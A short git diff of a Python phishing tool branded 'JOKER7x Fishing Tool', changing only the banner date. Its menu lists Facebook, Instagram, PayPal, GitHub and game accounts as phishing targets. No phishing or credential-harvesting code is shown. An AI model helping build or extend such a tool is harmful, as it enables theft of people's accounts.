@@ -16,7 +16,7 @@ class App:
         print ("\033[1;33m| |_| | | |_| | | | \ \  | |___  | | \ \         / /    / /\ \  
         print ("\033[1;31m\_____/ \_____/ |_|  \_\ |_____| |_|  \_\       /_/    /_/  \_\
         print (" ")
-        print ("\033[1;32m  JOKER7x Fishing Tool  \033[1;36m  * _ *  \033[1;32m  Version: \033[1;31m1   \033[1;32m Date: \033[1;31m15-4-2020            ")
+        print ("\033[1;32m  JOKER7x Fishing Tool  \033[1;36m  * _ *  \033[1;32m  Version: \033[1;31m1   \033[1;32m Date: \033[1;31m20-4-2020            ")
         print ("        ")
         SA = ['R#[G#1R#] C#FaceBook Accounts','R#[G#2R#] C#Instagram Accounts','R#[G#3R#] C#Paypal Accounts','R#[G#4R#] C#Github Accounts','R#[G#5R#] C#Yahoo Accounts','R#[G#6R#] C#Clash Of Clans Accounts','R#[G#7R#] C#PUBG Mobile Accounts','C#Available SoOoN..!'] 
         S = Style(*SA).Square(cols=2,padding_x=1,padding_y=1)
